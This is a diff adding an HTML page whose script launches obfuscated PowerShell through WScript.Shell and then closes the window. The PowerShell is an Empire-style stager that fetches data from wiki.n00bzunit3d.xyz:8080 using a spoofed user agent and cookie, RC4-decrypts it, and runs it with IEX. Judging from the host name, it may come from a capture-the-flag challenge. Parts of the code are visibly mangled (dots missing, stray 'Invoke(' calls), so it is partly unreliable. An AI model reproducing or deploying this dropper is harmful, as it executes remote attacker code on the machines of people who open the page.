@@ -1,0 +1,28 @@
+<html><head><script>var c= 'powershell -noP -sta -w 1 -enc   
+${Hm`4O`Nu}  = [tyPe]SYSTemnEtSerVIcePoINTMAnAGer ;  
+&('Sv') Oc7v ([TYPe]tExtENcoDING ) ;  
+('SV') "Xvy" ([tyPE]Convert ) ;  
+SeT-iteM  VaRIAble:lF4 ( [TYpe]SYSTemNETWEbrEQuEST)  ;  
+&('Sv') 2rG8P ( [tyPe]sysTEMNETcrEDENTIaLCaCHE)  ;   
+${c`DXY}  =[tYpe]SYsTEMTexTEncODiNg; 
+If(${PsVersIONtABlE}PSverSiOn"majOR -ge 3){}; 
+${hm4oNU}::exPeCT100continue=0;
+${W`c}=New-Object SystemNetWebClient;
+${U}="Mozilla/50 (Windows NT 61; WOW64; Trident/70; rv:110) like Gecko";
+${S`eR}=$( (  VaRIable oC7v -ValueoN )::UnicoDE"geTstRiNg( (  gET-vARIABLE XVy -ValUeonly)::FrOMBAse64STRiNg
+Invoke(aAB0AHQAcAA6AC8ALwB3AGkAawBpAC4AbgAwADAAYgB6AHUAbgBpAHQAMwBkAC4AeAB5AHoAOgA4ADAAOAAwAA==)));
+-> http://wiki.n00bzunit3d.xyz:8080
+
+${t}="/login/processphp"
+${wC}"hEadeRsAdd'Invoke(User-Agent,${u});
+${Wc}"pRoXy"= ${lF4}::"defAUlTwEbproXy";
+${wC}"pRoXy""CreDeNTIAls" =   ( GeT-ChiLdItEm "VarIABLE:2RG8P" "VALUE"::"dEFauLTneTworKCRedENtialS";
+${sCRIpT:pRoXY} = ${wc}"pRoxY";${k}=  (  &Get-vAriAbLE cDXY  )"vALUe"::"ascii"GetBytes Invoke('>InDlw&813YWk06|QbhSfBAx}cUMKqg(');
+${r}={${d},${K}=${ArgS};
+${s}=0255;0255|&('%'){${J}=(${J}+${s}[${_}]+${k}[${_}%${K}"c`ouNt"])%256;
+${S}[${_}],${S}[${J}]=${s}[${J}],${s}[${_}]};${d}|('%'){${I}=(${I}+1)%256;${H}=(${h}+${S}[${i}])%256;${S}[${i}],${s}[${H}]=${S}[${H}],${S}[${i}];${_}-bxor${s}[(${s}[${i}]+${S}[${H}])%256]}};
+${Wc}"HeAderS"Add Invoke(Cookie,RTLIIyw=DFByJ6ORKlBkaW6wuntyFYbYvLk=);
+${d`ATA}=${wC}DownloadData Invoke(${sEr}+${t});
+${I`V}=${dATa}[03];
+${d`ATA}=${D`Ata}[4${DaTA}"leNgTH"];-join[Char[]](& ${r} ${D`AtA} (${iv}+${K}))|IEX
+new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>
